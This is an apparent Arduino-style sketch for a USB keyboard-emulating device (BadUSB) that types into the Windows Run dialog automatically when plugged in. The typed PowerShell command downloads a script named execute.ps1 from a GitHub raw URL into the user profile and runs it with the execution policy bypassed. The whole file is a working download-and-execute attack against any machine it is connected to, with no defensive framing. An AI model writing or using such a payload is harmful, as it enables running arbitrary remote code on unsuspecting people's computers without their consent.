#include <USB.h>
#include <USBHIDKeyboard.h>
#include "keyboardLayout/Keyboard_de_DE.h"

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();
  Keyboard.begin(KeyboardLayout_de_DE); 
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("powershell.exe -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p");
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:
}

//https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1